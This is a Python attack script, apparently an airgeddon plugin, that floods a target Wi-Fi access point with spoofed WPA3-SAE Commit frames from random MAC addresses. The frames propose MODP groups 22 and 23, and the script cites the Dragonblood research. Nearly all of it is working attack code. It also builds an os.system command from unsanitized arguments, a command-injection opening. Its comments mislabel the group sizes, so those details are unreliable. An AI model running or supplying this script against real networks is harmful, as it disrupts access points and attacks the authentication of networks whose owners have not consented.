#!/usr/bin/env python3
"""
WPA3-SAE Downgrade Attack Engine for airgeddon plugin.
Sends SAE Commit frames that propose weak MODP groups (22/23).
Based on CVE-2019-9499 / Dragonblood research.
"""
import sys
import os
import time
import random
from scapy.all import RadioTap, Dot11, Dot11Auth, RandMAC, sendp

# Language dictionary (matches Airgeddon's language variable names)
ARR = {
    ("ENGLISH", 0): "Downgrade attack running on {iface} → {bssid} (channel {channel})",
    ("GERMAN", 0): "Downgrade-Angriff läuft auf {iface} → {bssid} (Kanal {channel})",
    ("SPANISH", 0): "Ataque de downgrade en {iface} → {bssid} (canal {channel})",
    ("FRENCH", 0): "Attaque de downgrade sur {iface} → {bssid} (canal {channel})",
    ("PORTUGUESE", 0): "Ataque de downgrade em {iface} → {bssid} (canal {channel})",
    ("RUSSIAN", 0): "Атака downgrade на {iface} → {bssid} (канал {channel})",
    ("GREEK", 0): "Επίθεση downgrade σε {iface} → {bssid} (κανάλι {channel})",
    ("ITALIAN", 0): "Attacco di downgrade su {iface} → {bssid} (canale {channel})",
    ("POLISH", 0): "Atak downgrade na {iface} → {bssid} (kanał {channel})",
    ("TURKISH", 0): "{iface} → {bssid} üzerinde downgrade saldırısı (kanal {channel})",
    ("ARABIC", 0): "هجوم downgrade على {iface} → {bssid} (القناة {channel})",
    ("CHINESE", 0): "降级攻击运行于 {iface} → {bssid}（信道 {channel}）",
    ("CATALAN", 0): "Atac de downgrade a {iface} → {bssid} (canal {channel})",
    
    ("ENGLISH", 1): "Burst #{count} sent ({frames} frames). Groups: {groups}",
    ("GERMAN", 1): "Burst #{count} gesendet ({frames} Frames). Gruppen: {groups}",
    ("SPANISH", 1): "Burst #{count} enviado ({frames} tramas). Grupos: {groups}",
    ("FRENCH", 1): "Burst #{count} envoyé ({frames} trames). Groupes: {groups}",
    ("PORTUGUESE", 1): "Burst #{count} enviado ({frames} quadros). Grupos: {groups}",
    ("RUSSIAN", 1): "Burst #{count} отправлен ({frames} кадров). Группы: {groups}",
    ("GREEK", 1): "Burst #{count} εστάλη ({frames} πλαίσια). Ομάδες: {groups}",
    ("ITALIAN", 1): "Burst #{count} inviato ({frames} frame). Gruppi: {groups}",
    ("POLISH", 1): "Wysłano Burst #{count} ({frames} ramek). Grupy: {groups}",
    ("TURKISH", 1): "Burst #{count} gönderildi ({frames} çerçeve). Gruplar: {groups}",
    ("ARABIC", 1): "تم إرسال الدفعة #{count} ({frames} إطار). المجموعات: {groups}",
    ("CHINESE", 1): "已发送第 #{count} 波 ({frames} 帧). 组：{groups}",
    ("CATALAN", 1): "Burst #{count} enviat ({frames} frames). Grups: {groups}",
    
    ("ENGLISH", 2): "Attack stopped.",
    ("GERMAN", 2): "Angriff gestoppt.",
    ("SPANISH", 2): "Ataque detenido.",
    ("FRENCH", 2): "Attaque arrêtée.",
    ("PORTUGUESE", 2): "Ataque interrompido.",
    ("RUSSIAN", 2): "Атака остановлена.",
    ("GREEK", 2): "Η επίθεση σταμάτησε.",
    ("ITALIAN", 2): "Attacco fermato.",
    ("POLISH", 2): "Atak zatrzymany.",
    ("TURKISH", 2): "Saldırı durduruldu.",
    ("ARABIC", 2): "تم إيقاف الهجوم.",
    ("CHINESE", 2): "攻击已停止。",
    ("CATALAN", 2): "Atac aturat.",
}

def msg(lang, key, **kw):
    """Get localized message with optional formatting."""
    template = ARR.get((lang, key), ARR.get(("ENGLISH", key), ""))
    return template.format(**kw) if kw else template

# IEEE 802.11-2020 MODP group definitions (scalar_len, element_len)
WEAK_GROUPS = {
    22: (32, 256),  # MODP 2048
    23: (32, 384),  # MODP 3072
}
BURST_SIZE = 64     # You can increase this to 128 for stronger bursts
INTER_FRAME_DELAY = 0.0001

def build_downgrade_commit(bssid, mac_src, group_id, scalar_len, element_len):
    """Construct a SAE Commit frame targeting a specific MODP group."""
    # Group ID in big-endian (2 bytes)
    group_bytes = group_id.to_bytes(2, 'big')
    # Cryptographically random scalar and element
    scalar = os.urandom(scalar_len)
    element = os.urandom(element_len)
    # Payload structure: Group ID | Scalar | Element
    payload = group_bytes + scalar + element
    
    return (
        RadioTap() /
        Dot11(type=0, subtype=11, addr1=bssid, addr2=mac_src, addr3=bssid) /
        Dot11Auth(algo=3, seqnum=1, status=0) /  # algo 3 = SAE
        payload
    )

def main():
    # Accept 4 or 5 arguments (language parameter is optional)
    if len(sys.argv) < 4:
        print("Usage: downgrade_attack.py <bssid> <channel> <interface> [language]")
        time.sleep(5)
        sys.exit(1)
    
    # Correct order: bssid, channel, interface, language
    bssid = sys.argv[1].lower()
    channel = sys.argv[2]
    interface = sys.argv[3]
    language = sys.argv[4] if len(sys.argv) > 4 else "ENGLISH"
    
    # Set wireless channel
    os.system(f"iw dev {interface} set channel {channel} 2>/dev/null")
    time.sleep(0.3)
    
    # Display localized start message
    print(msg(language, 0, iface=interface, bssid=bssid, channel=channel), flush=True)
    
    burst_count = 0
    try:
        while True:
            packets = []
            for g in WEAK_GROUPS:
                s_len, e_len = WEAK_GROUPS[g]
                for _ in range(BURST_SIZE // len(WEAK_GROUPS)):
                    mac = str(RandMAC())
                    pkt = build_downgrade_commit(bssid, mac, g, s_len, e_len)
                    packets.append(pkt)
            
            # Transmit burst
            sendp(packets, iface=interface, verbose=False, inter=INTER_FRAME_DELAY)
            burst_count += 1
            
            # Display localized progress message
            m = msg(language, 1, count=burst_count, frames=len(packets), groups=list(WEAK_GROUPS.keys()))
            print(f"\r{m}", end='', flush=True)
            time.sleep(0.5)
            
    except KeyboardInterrupt:
        pass
    finally:
        print(f"\n{msg(language, 2)}")

if __name__ == "__main__":
    main()
